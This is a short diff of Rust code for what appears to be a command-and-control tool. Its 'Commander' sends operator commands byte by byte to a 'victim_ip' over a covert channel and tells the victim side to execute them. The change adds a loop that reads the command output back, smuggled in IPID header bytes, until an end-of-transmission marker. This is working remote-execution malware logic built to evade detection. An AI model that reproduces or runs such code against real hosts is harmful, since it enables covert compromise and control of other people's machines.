@@ -251,19 +251,32 @@ impl Commander {
     fn run_program(&self) {
         if let Some(ip) = self.victim_ip {
             let cmd = prompt("Command to run: ");
-            println!("[*] Sending '{}' via covert channel...", cmd);
-            
+            if cmd.is_empty() { return; }
+
             let mut transmitter = covert::CovertChannel::new(ip);
             
-            // 1. Send each character of the command
+            // 1. Send the command string
             for byte in cmd.as_bytes() {
                 transmitter.send_byte(*byte);
-                thread::sleep(Duration::from_millis(5)); // Small delay for reliability
+                thread::sleep(Duration::from_millis(5)); 
             }
+            transmitter.send_byte(b'\n'); // Tell victim to execute
             
-            // 2. Send a newline to tell the victim to execute
-            transmitter.send_byte(b'\n');
-            println!("[+] Command sent. Results should appear in the PCAP/Console.");
+            println!("[*] Command sent. Waiting for output...");
+
+            // 2. Listen for the response
+            loop {
+                // Use the receiver to catch the IPID bytes coming back
+                if let Some((byte, _)) = covert::CovertChannel::receive_byte() {
+                    if byte == 0x04 { // Our EOT signal
+                        break;
+                    }
+                    // Print the byte as a character immediately
+                    print!("{}", byte as char);
+                    io::stdout().flush().unwrap();
+                }
+            }
+            println!("\n[+] Done.");
         }
     }
 }
